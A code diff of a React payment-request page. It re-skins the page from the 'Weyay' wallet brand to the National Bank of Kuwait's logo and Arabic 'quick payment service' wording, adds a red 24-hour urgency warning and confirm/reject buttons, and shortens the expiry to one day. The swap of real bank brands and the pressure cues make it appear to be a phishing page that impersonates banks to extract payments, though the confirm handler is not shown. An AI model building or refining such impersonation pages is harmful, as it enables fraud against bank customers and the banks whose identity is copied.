@@ -36,7 +36,7 @@ const dummyPaymentData = {
     amount: 30.000,
     currency: "KWD",
     description: "Family Support",
-    expiryDate: "2025-12-31",
+    expiryDate: "2025-08-20",
     createdAt: "2025-08-19"
   }
 };
@@ -47,7 +47,7 @@ const defaultPaymentData = {
   amount: 30.000,
   currency: "KWD",
   description: "Family Support",
-  expiryDate: "2025-12-31",
+  expiryDate: "2025-08-20",
   createdAt: "2025-08-19"
 };
 
@@ -103,60 +103,65 @@ const PaymentPage = () => {
     return symbols[currency] || currency;
   };
 
-  const { integer, decimal } = formatAmount(paymentData.amount);
   const currencySymbol = getCurrencySymbol(paymentData.currency || 'KWD');
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-black via-purple-900 to-purple-800 text-white">
-      <div className="container mx-auto px-6 py-8 max-w-md">
-        {/* Header with Weyay Logo */}
-        <div className="text-center mb-20 pt-12">
-          <div className="text-2xl font-bold text-white" style={{ fontFamily: 'Arial' }}>
-            ويــاي <span className="text-emerald-400">≡</span>
+    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
+      {/* شعار NBK */}
+      <div className="mb-8">
+        <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" />
+      </div>
+      
+      {/* عنوان الخدمة */}
+      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
+        خدمة الدفع السريع
+      </h1>
+      
+      {/* معلومات الدفع */}
+      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
+        <div className="space-y-4 text-right">
+          <div className="flex justify-between items-center">
+            <span className="font-bold">{paymentData.customerName}</span>
+            <span className="text-gray-700">:اسم المستلم</span>
           </div>
-        </div>
-
-        {/* Customer Avatar and Info */}
-        <div className="text-center mb-16">
-          <div className="w-32 h-32 bg-gray-600 rounded-full mx-auto mb-8 flex items-center justify-center">
-            <span className="text-5xl font-bold text-white">
-              {paymentData.customerName.charAt(0).toUpperCase()}
-            </span>
-          </div>
-          <h2 className="text-2xl font-semibold mb-6 text-white tracking-wide">{paymentData.customerName.toUpperCase()}</h2>
-          <p className="text-gray-300 text-xl mb-12">طلب منك</p>
           
-          {/* Amount Display */}
-          <div className="text-center mb-20">
-            <div className="flex justify-center items-baseline">
-              <span className="text-xl ml-2 text-white">{currencySymbol}</span>
-              <span className="text-7xl font-bold text-white">{integer}</span>
-              <span className="text-2xl text-white">.{decimal}</span>
-            </div>
+          <div className="flex justify-between items-center">
+            <span className="font-bold">{paymentData.amount.toFixed(3)} {currencySymbol}</span>
+            <span className="text-gray-700">:المبلغ</span>
+          </div>
+          
+          <div className="flex justify-between items-center">
+            <span className="font-bold">{paymentData.description}</span>
+            <span className="text-gray-700">:الغرض</span>
+          </div>
+          
+          <div className="flex justify-between items-center">
+            <span className="font-bold text-red-600">صالح لمدة 24 ساعة</span>
+            <span className="text-gray-700">:انتهاء الصلاحية</span>
           </div>
         </div>
-
-        {/* Bill Payment Purpose */}
-        <div className="mb-8">
-          <div className="bg-gray-700/40 rounded-2xl p-6">
-            <div className="text-right mb-3">
-              <span className="text-lg text-gray-300">الغرض</span>
-            </div>
-            <div className="text-xl font-medium text-white text-center">
-              {paymentData.description || "Bill Payment"}
-            </div>
-          </div>
-        </div>
-
-        {/* Confirm Button */}
-        <div className="mt-12">
-          <button
-            onClick={handleConfirm}
-            className="w-full bg-emerald-400 text-black py-5 rounded-2xl text-xl font-bold hover:bg-emerald-500 transition-colors"
-          >
-            أكـد
-          </button>
-        </div>
+      </div>
+      
+      {/* تنبيه مهم */}
+      <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
+        يرجى عدم إغلاق الصفحة بعد إتمام عملية الدفع لحين ظهور صفحة التأكيد التي تفيد بأن العملية ناجحة لتفادي أي مشاكل قد تنتج عن ذلك.
+      </div>
+      
+      {/* أزرار التحكم */}
+      <div className="flex flex-col gap-3 w-full max-w-md">
+        <button 
+          onClick={handleConfirm}
+          className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 text-lg rounded-lg transition-colors"
+        >
+          تأكيد
+        </button>
+        
+        <button 
+          className="w-full border border-gray-300 text-gray-700 py-3 text-lg rounded-lg hover:bg-gray-50 transition-colors"
+          onClick={() => alert('تم رفض عملية الدفع')}
+        >
+          رفض
+        </button>
       </div>
     </div>
   );
